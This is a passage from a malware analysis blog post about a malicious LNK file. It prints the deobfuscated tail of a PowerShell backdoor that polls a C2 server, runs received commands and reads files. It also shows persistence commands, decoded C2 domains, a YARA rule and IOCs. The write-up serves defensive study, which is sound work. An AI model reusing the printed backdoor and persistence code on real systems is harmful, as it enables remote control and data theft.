+        }
+
+        $l1ool0ol1oo0l1o0l = $null
+    }
+}
+
+function Execute{
+    param()
+    process{
+        if ($global:l000l1l0l0l -ne $null){
+                
+            if($global:l000l1l0l0l.StartsWith($global:llo0l1loll1l)){
+                $global:l000l1l0l0l = $global:l000l1l0l0l.Substring($global:llo0l1loll1l.Length)
+              try{
+                $global:ool0l00l1l0 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($global:l000l1l0l0l))
+              }  
+              catch{
+                  $global:ool0l00l1l0 = $_.Exception.message
+              }
+            }
+            else {
+                try{
+                    switch($global:l000l1l0l0l.Split(" ",2)[0]){
+                        $global:llo0l0lloll1{
+                            $global:o1l0lol10ol0 = [int]$global:l000l1l0l0l.Split(" ",2)[1]
+                            $global:ool0l00l1l0 = $global:l1o0l1loll1 + $global:o1l0lol10ol0
+                        ;break
+                        }
+                        Default{
+                            if ($global:l000l1l0l0l) {
+                                $job = start-job -scriptblock {
+                                                            param($c)
+                                                                    try {
+                                                                            Invoke-Expression ($c) | out-string 
+                                                                        }
+                                                                    catch {
+                                                                            $_.Exception.message
+                                                                        }
+                                                                } -Arg $global:l000l1l0l0l
+                            if (wait-job $job -Timeout $global:l0100ll10ll0) {
+                                $global:ool0l00l1l0 = receive-job $job
+                            }
+                            else {
+                                $global:ool0l00l1l0 = ""
+                                Remove-Job -force $job
+                        }
+                    }
+                            ;break;
+                        }
+
+                    }
+
+
+                } 
+                catch {
+                    $global:ool0l00l1l0 = $_.Exception.message
+                }
+                $global:ool0l00l1l0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($global:ool0l00l1l0))
+                $global:l000l1l0l0l = $null
+            }
+        }
+    }
+}
+#Main
+while ($true) {
+    if($global:l0l1l0l1l -eq $null){ 
+        $global:l0l1l0l1l = Invoke-Expression -Command "Get-WMIObject -Class Win32_ComputerSystem | Select-Object -Property `"Manufacturer`" | ft -HideTableHeaders"  | Out-String -OutVariable out
+        $global:l0l1l0l1l = $global:l0l1l0l1l.Trim() + ";"
+        $global:l0l1l0l1l += Invoke-Expression -Command "Get-WMIObject -Class Win32_ComputerSystem | Select-Object -Property `"Model`" | ft -HideTableHeaders"  | Out-String -OutVariable out
+        $global:l0l1l0l1l = $global:l0l1l0l1l.Trim() + ";"
+        $global:l0l1l0l1l += Invoke-Expression -Command "Get-WMIObject -Class Win32_ComputerSystem | Select-Object -Property `"Name`" | ft -HideTableHeaders"  | Out-String -OutVariable out
+        $global:l0l1l0l1l = $global:l0l1l0l1l.Trim() + ";"
+        $global:l0l1l0l1l += Invoke-Expression -Command "Get-WMIObject -Class Win32_ComputerSystemProduct | Select-Object -Property `"IdentifyingNumber`" | ft -HideTableHeaders" | Out-String -OutVariable out
+        $global:l0l1l0l1l = $global:l0l1l0l1l.Trim()
+        $global:l0l1l0l1l = $global:l0l1l0l1l.Replace("`n","").Replace("`r","")
+    }
+    else
+    {
+        MakeRequest "l10lll101l0l"
+        MakeRequest "l10l11l1l000l1ll10"
+        Execute
+        MakeRequest "ol11ool1llool1llol"
+    }
+    Start-Sleep -Seconds $global:o1l0lol10ol0
+}
+</code></pre>
+<p>The author has attempted to confuse analysis with similar variable names mixed with some Base64, and then ending with some Windows Management Instrumentation (WMI) calls. Let&rsquo;s look at the Base64 strings first:</p>
+<pre><code class="xml">Regular_expression('User defined','\\("[a-zA-Z0-9/=+]{3,}"\\)',true,true,false,false,false,false,'List matches')
+Find_/_Replace({'option':'Simple string','string':'("'},'',true,false,true,false)
+Find_/_Replace({'option':'Simple string','string':'")'},'',true,false,true,false)
+Fork('\\n','\\n',false)
+From_Base64('A-Za-z0-9+/=',true)
+</code></pre>
+<p>Gives a list of strings as follows:</p>
+<pre><code class="xml">System.Web.Extensions
+hxxps://zruwodree.gq
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.105 Safari/537.36 Edge/12.246
+X-Reg
+Cookie
+Set-Cookie
+POST
+GET
+Created
+command
+taskId
+type
+#wait
+new timeout:
+</code></pre>
+<p>So another domain <code>hxxps://zruwodree.gq</code>, and a User Agent <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.105 Safari/537.36 Edge/12.246</code>.</p>
+<p>Tracing back in the script we can determine the variables referenced in this section of code: <code>$lo1o1olo1l</code> and <code>$oolo1olo1l</code> refer to the above Base64 encoded domain and User Agent:</p>
+<pre><code class="xml">#Functions
+function MakeRequest{
+    param ($_type)
+    process {
+        $l1ool0ol1oo0l1o0l = [System.Net.HttpWebRequest]::Create($lo1o1olo1l)
+        $l1ool0ol1oo0l1o0l.UserAgent = $global:oolo1olo1l
+</code></pre>
+<p>Without looking further, I&rsquo;ll make a leap and assess there is communication (GET/POST) with the second C2 and likely the results of the WMI output are POSTed back. <a href="https://www.fireeye.com/blog/threat-research/2016/10/increased_use_ofwmi.html">Fireeye did some research</a> into specific WMI calls such as these, and it is likely used for virtual machine detection. For example, on my non-virtualised host the result of <code>Get-WMIObject -Class Win32_ComputerSystem</code> is:</p>
+<pre><code class="xml">Domain              : WORKGROUP
+Manufacturer        : LENOVO
+Model               : 20F9CTO1WW
+Name                : DFIR
+PrimaryOwnerName    : (redacted)
+TotalPhysicalMemory : 34171711488
+</code></pre>
+<p>Compared to my VMWare environment:</p>
+<pre><code class="xml">Domain              : WORKGROUP
+Manufacturer        : VMware, Inc.
+Model               : VMware Virtual Platform
+Name                : DESKTOP
+PrimaryOwnerName    : (redacted)
+TotalPhysicalMemory : 2146947072
+</code></pre>
+<h2 id="dynamic-analysis">Dynamic Analysis</h2>
+<p>Dynamic analysis is a great way to confirm the initial analysis of parsing out the scripts and seeing what you missed by a simple deobfuscation. In this case I ran the LNK file alongside <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> and <a href="https://sourceforge.net/projects/regshot/">RegShot</a>. On a separate <a href="https://remnux.org/">Remnux</a> VM I ran <a href="https://www.inetsim.org/">iNetSIM</a> and <a href="https://www.wireshark.org/">Wireshark</a>.</p>
+<p>Importing Process Explorer into <a href="https://www.procdot.com/">ProcDOT</a> is the easiest way to visualise what is going on, alongside the RegShot output. In summary we can observe:</p>
+<ul>
+<li>The LNK file launching PowerShell to extract the VBE to  <code>C:\Users\abc\AppData\Roaming\</code></li>
+<li>Wscript running the VBE as <code>wscript  //B &quot;C:\Users\abc\AppData\Roaming\_.vbe&quot;</code></li>
+<li>Setting the registry values to lower internet security and proxy settings<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>  <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName</code>,  <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass</code>,  <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet</code>, and <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect</code></li>
+<li>Attempts to create the file <code>C:\Users\abc\client</code></li>
+<li>Attempts to run the command <code>&quot;C:\Windows\System32\expand.exe&quot; &quot;C:\Users\abc\client&quot; &quot;C:\Users\abc\client.ps1&quot;</code></li>
+<li>Attempts to delete the file <code>C:\Users\abc\client</code></li>
+<li>Attempts to hide the file via <code>&quot;C:\Windows\System32\attrib.exe&quot; +h +s +r &quot;C:\Users\abc\client.ps1&quot;</code></li>
+<li>Creates file <code>C:\Users\abc\SYSTEM</code></li>
+<li>Creates a file at <code>C:\Users\abc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\.lnk</code></li>
+<li>Sets Registry Key <code>&quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\</code> to execute the file <code>.lnk</code></li>
+</ul>
+<p>Looking at the files created there are no significant surprises from the static analysis, just the details of putting the strings together:</p>
+<h3 id="lnk">.lnk</h3>
+<p>The file <code>.lnk</code> is another LNK file with the malicious code to execute the persistence <code>SYSTEM</code></p>
+<p><code>\Windows\System32\cmd.exe.%CD%+/c wscript //B //E:vbs %userprofile%\SYSTEM.C:\Windows\System32\Shell32.dll</code></p>
+<h3 id="system">SYSTEM</h3>
+<p>The file <code>SYSTEM</code> will be used to execute the <code>client.ps1</code> PowerShell:</p>
+<p><code>Dim shell,command Set shell = CreateObject(&quot;Wscript.Shell&quot;) command = &quot;powershell -noLogo -NonInteractive -ExecutionPolicy Bypass  -c &quot;&quot;invoke-expression $env:userprofile'\client.ps1'&quot;&quot;&quot; shell.Run command,0</code></p>
+<h3 id="clientps1-1">client.ps1</h3>
+<p>There are two problems that we&rsquo;ve now hit in our analysis. First, the file <code>client.ps1</code> is broken. The Base64 encoded domain <code>hxxps://zruwodree.gq</code> throws an error due to invalid length:</p>
+<pre><code class="xml">$global:lo1o1olo1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cH
+6Ly96cnV3b2RyZWUuZ3E"))
+Exception calling "FromBase64String" with "1" argument(s): "Invalid length for a Base-64 char array or string."
+At line:1 char:1
++ $global:lo1o1olo1l = [System.Text.Encoding]::UTF8.GetString([System.C ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : FormatException
+</code></pre>
+<p>The Base64 needs another byte of padding, <code>=</code>, to be valid. Even when this is patched, we get another error when running the script:</p>
+<pre><code class="xml">Exception calling "GetResponse" with "0" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."
+At C:\Users\abc\Desktop\client.ps1:40 char:17
++ ...             $ll1ool0lollo1l = [System.Net.HttpWebResponse] $l1ool0ol1 ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+</code></pre>
+<h2 id="summary">Summary</h2>
+<p>We can&rsquo;t go much further with this if the domain is down and the script is broken. Further, the domain <code>hxxps://zruwodree.gq</code> wasn&rsquo;t up at the time of writing so the final purpose/payload wasn&rsquo;t identified. However, this has been a good exercise to step through a series of hoops both in static and dynamic analysis: LNK file -&gt; PowerShell -&gt; Encoded VBE -&gt; Wscript -&gt; PowerShell -&gt; WMI calls.</p>
+<p>There is still a wealth of analysis than can be done on this one sample:</p>
+<ul>
+<li>LNK toolmark analysis;</li>
+<li>Retrohunt similar samples; or</li>
+<li>OSINT for the domains <code>hxxps://zruwodree.gq</code> and <code>hxxps://zwqip.ml</code>, or the coding style.</li>
+</ul>
+<p>A YARA rule to start with could concentrate on the LNK file embedded VBE payload:</p>
+<pre><code class="xml">rule LNK_with_VBE { 
+ meta: 
+  description = "Detects LNK file with embedded VBE script" 
+  author = "@mattnotmax" 
+  date = "2019-11-16" 
+  hash1 = "D28C1C4F4C705B21E84ADADB42594E42543DF4F1C4B44219569DC18B375E78E3"
+  strings: 
+  $a1 = "#@~^" ascii 
+  $a2 = "^#~@" ascii   
+condition: uint16(0) == 0x4c and ($a1 and $a2)
+}</code></pre>
+<p>I hope this walk-through has been informative. If you have any questions, comments or notice a glaring error, let me know at <a href="mailto:matt@bitofhex.com">matt@bitofhex.com</a> or via <a href="https://twitter.com/mattnotmax">@mattnotmax</a></p>
+<h4 id="iocs">IOCs:</h4>
+<p>D28C1C4F4C705B21E84ADADB42594E42543DF4F1C4B44219569DC18B375E78E3 (<code>foto.lnk</code>)
+3FA019CEC8B4FF90344C595494F5CBA0E5915210C0E8B175C452566C1034B680 (original <code>client.ps1</code>)
+bc6db592752c65eaf8656c6c74705d1d1eb6136da46d6397a420e84041a19a34 (patched <code>client.ps1</code>)
+hxxps://zwqip.ml
+hxxps://zruwodree.gq</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>If I&rsquo;m incorrect, could the APT responsible please let me know to fix any errors: <a href="mailto:matt@bitofhex.com">matt@bitofhex.com</a>. Thanks! :) <a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p>See: <a href="https://getadmx.com/HKCU/Software/Policies/Microsoft/Windows/CurrentVersion/Internet%20Settings/ZoneMap">https://getadmx.com/HKCU/Software/Policies/Microsoft/Windows/CurrentVersion/Internet%20Settings/ZoneMap</a> <a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="https://mattnotmax.github.io/2019/11/say-cheese-an-analysis-of-foto-lnk/" title="&#34;Say Cheese!&#34; An analysis of foto.lnk" target="_blank" rel="external">https://mattnotmax.github.io/2019/11/say-cheese-an-analysis-of-foto-lnk/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://twitter.com/mattnotmax" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://mattnotmax.github.io/logo.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://twitter.com/mattnotmax" target="_blank"><span class="text-dark">bit_of_hex</span><small class="ml-1x">digital forensics | incident response</small></a></h3>
+        <div>476c616420796f7520617265207468617420696e74657265737465642e204861766520612067726561742064617921</div>
+      </div>
+    </figure>
+  </div>
+</div>
+    </div>
+  </article>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://mattnotmax.github.io/2019/07/deriving-intelligence-from-lnk-files/" title="Deriving intelligence from LNK files"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="https://mattnotmax.github.io/2020/02/sapphire-mushroom-lnk-files/"
+                    title="Suspected Sapphire Mushroom (APT-C-12) malicious LNK files"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Catalogue</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="facebook,twitter,linkedin,google"
+                data-mobile-sites="facebook,twitter,linkedin,google"></div>
+        </div>
+    </div>
+</nav>
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/mattnotmax" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://mattnotmax.github.io/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+    <li><a href="https://twitter.com/mattnotmax" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-twitter"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;2018  -
+    2020
+    <div class="publishby">
+        Theme by <a href="https://github.com/xiaoheiAh" target="_blank"> xiaoheiAh </a>base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/powershell.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://mattnotmax.github.io/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://mattnotmax.github.io/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            ROOT_URL: 'https:\/\/mattnotmax.github.io\/',
+            CONTENT_URL: 'https:\/\/mattnotmax.github.io\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://mattnotmax.github.io/js/insight.min.a343cd9a5a7698336b28ef3a7c16a3a1b1d2d5fb17dc8ed04022bbe08cc5459073a15bdafa3a8a58cdd56080784bdd69fa70b1ae8597565c799c57ed00f0e120.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
